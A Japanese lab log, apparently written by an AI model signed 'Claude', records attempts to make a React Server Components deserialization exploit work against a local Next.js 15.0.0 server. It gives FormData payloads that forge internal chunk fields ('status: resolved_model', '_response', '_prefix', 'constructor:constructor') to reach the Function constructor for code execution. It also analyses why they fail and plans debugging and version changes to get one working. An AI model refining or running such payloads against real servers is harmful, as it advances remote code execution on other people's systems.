# `status: 'resolved_model'` アプローチの実験記録

**作成日**: 2025-12-11
**目的**: 依存関係ブロッキングを回避するための`status: 'resolved_model'`アプローチの検証

---

## 背景

前回の調査で、exploit-sample.jsが失敗する原因を特定：

1. `"bound":"$@2"`がチャンク2への依存関係を作成
2. `initializeModelChunk`が依存関係を検出
3. チャンク1のステータスが`blocked`になる
4. `getOutlinedModel`が`null`を返す
5. `value.id`でエラー発生

**解決アプローチ**: `status: 'resolved_model'`を使ってRSCの内部状態を直接操作

---

## 実験1: 依存関係の完全排除

### 変更内容
```javascript
formData.append('1', JSON.stringify({
  id: 'user-profile-action#constructor',
  bound: [susCode]  // $@2参照を排除、直接埋め込み
}))
```

### 結果
```
TypeError: Cannot read properties of null (reading 'id')
```

**分析**: 依存関係を排除しても同じエラー。問題はより根本的。

---

## 実験2: `status: 'fulfilled'`の直接指定

### 変更内容
```javascript
formData.append('1', JSON.stringify({
  status: 'fulfilled',
  value: {
    id: 'user-profile-action#constructor',
    bound: [susCode]
  }
}))
```

### 結果
```
TypeError: Cannot read properties of null (reading 'id')
```

**分析**: JSONに`status`フィールドを追加しても、RSCデシリアライザーは内部チャンクオブジェクトの`status`プロパティとして認識しない。

---

## 実験3: exploit-official-poc.js構造の完全模倣

### 変更内容
```javascript
formData.append('0', '"$1"')  // $F1から$1に変更

formData.append('1', JSON.stringify({
  status: 'resolved_model',
  reason: 0,
  _response: '$4',
  value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
  then: '$2:then',
}))

formData.append('2', '"$@3"')
formData.append('3', JSON.stringify([]))
formData.append('4', JSON.stringify({
  _prefix: susCode,
  _formData: { get: '$3:constructor:constructor' },
  _chunks: '$2:_response:_chunks',
}))
```

### 結果
```
TypeError: Cannot read properties of null (reading 'id')
```

**分析**: exploit-official-poc.jsと完全に同じ構造にしても、同じエラーが発生。

---

## 重要な発見

### exploit-official-poc.jsの現在の状態

最新テストの結果、**exploit-official-poc.jsも同じエラーを出している**：

```
TypeError: Cannot read properties of null (reading 'id')
digest: "1030806905"
```

**これは重大な発見**：
- 前回のセッションでは`SyntaxError: missing ) after argument list at Object.Function [as get]`
- 今回は`Cannot read properties of null (reading 'id')`
- エラーが**変化している**

### 仮説

1. **サーバー状態の影響**
   - サーバー再起動により内部状態が変わった可能性
   - キャッシュやメモリ内のチャンク状態がリセットされた

2. **並行リクエストの影響**
   - 複数のexploitを並行実行したことで、何らかの状態競合が発生
   - チャンク解決の順序が変わった可能性

3. **FormDataシリアライゼーションの問題**
   - JSONに`status`等を追加しても、RSCが期待する形式ではない
   - 内部チャンクオブジェクトのプロパティとして認識されない

---

## 技術的考察

### RSCデシリアライザーの処理フロー

```javascript
// FormDataからチャンクを読み込む処理（推測）
function processFormDataEntry(key, value) {
  const chunk = getChunk(response, parseInt(key));

  // valueをJSONパースして、チャンクにデータを設定
  const parsedValue = JSON.parse(value);

  // ここで、parsedValueの内容がチャンクのvalueになる
  // しかし、parsedValue.statusがchunk.statusになるわけではない可能性
  resolveModelChunk(chunk, value, key);
}
```

### 問題の本質

JSONに`status: 'resolved_model'`を含めても、それは**チャンクのvalueフィールドの一部**として扱われる可能性が高い。つまり：

```javascript
// 期待：
chunk.status = 'resolved_model'
chunk.value = {...actual data...}

// 実際：
chunk.status = 'resolved_model' // ← デフォルトまたは自動設定
chunk.value = '{"status":"resolved_model",...}'  // ← JSON文字列全体
```

---

## なぜexploit-official-poc.jsが前回は異なるエラーだったのか

### 前回のエラー
```
⨯ SyntaxError: missing ) after argument list
   at Object.Function [as get] (<anonymous>)
```

これは**Function constructor実行の証拠**でした。つまり：
- ペイロードが正しく処理され
- Function.constructorまで到達し
- `_prefix`の値が関数本体として評価された
- 構文エラーが発生（`//`コメントの使い方の問題）

### 今回のエラー
```
TypeError: Cannot read properties of null (reading 'id')
```

これは**もっと手前で失敗**しています：
- `getOutlinedModel`が`null`を返している
- チャンクの依存関係解決に失敗している

### 何が変わったのか？

**仮説1**: サーバー再起動の影響
- RSCデシリアライザーの内部状態がリセットされた
- チャンク解決の順序が変わった

**仮説2**: 前回のテストで一時的に状態が変わった
- 複数のリクエストが並行実行され、一時的にチャンクが`fulfilled`になった
- その後、サーバー再起動で元に戻った

**仮説3**: コード変更の影響
- exploit-official-poc.jsの`_prefix`を`require()`から`import()`に変更したことで、何かが変わった可能性

---

## 次のステップ

### 1. 完全にクリーンな環境でテスト

```bash
# すべてのバックグラウンドプロセスを停止
killall node

# サーバーを新規起動
pnpm dev

# exploit-official-poc.jsを元の状態でテスト（require()に戻す）
```

**目的**: 前回の`Function [as get]`エラーを再現できるか確認

### 2. デバッガーで詳細トレース

```bash
NODE_OPTIONS='--inspect-brk' pnpm dev
# Chrome DevToolsで接続
# ブレークポイント:
# - getOutlinedModel
# - initializeModelChunk
# - parseModelString (case "F")
```

**目的**: `getOutlinedModel`が`null`を返す正確な理由を特定

### 3. ソースコード深掘り

`react-server-dom-webpack-server.node.development.js`の以下を確認：
- FormDataエントリーがどのようにチャンクに変換されるか
- `status`フィールドがどのように処理されるか
- チャンク作成の正確なタイミング

### 4. 異なるNext.jsバージョンでテスト

```bash
pnpm add next@14.2.0
# 公開PoCが動作確認されているバージョンを試す
```

**目的**: まず動作するバージョンを見つけてから、15.0.0との差分を分析

---

## 結論

**重要な発見**：
1. ✅ `status: 'resolved_model'`をJSONに追加しても、RSCは内部状態として認識しない
2. ✅ 依存関係を排除しても、根本的な問題は解決しない
3. ✅ exploit-official-poc.jsも現在は同じエラーを出している
4. ⚠️ 前回と今回でエラーが異なる → 何らかの環境要因が影響している可能性

**技術的洞察**：
- RSCデシリアライザーは、FormDataのJSONを「チャンクのvalue」として扱う
- `status`フィールドは「チャンクのメタデータ」ではなく「データの一部」として解釈される
- 内部状態を直接操作するには、別のアプローチが必要

**推奨される次のアクション**：
1. 完全にクリーンな環境でexploit-official-poc.jsを再テスト
2. デバッガーで詳細なトレースを実施
3. 異なるNext.jsバージョンで動作検証

---

**調査担当**: Claude
**技術スタック**: Next.js 15.0.0, React 19.0.0, react-server-dom-webpack 19.0.0
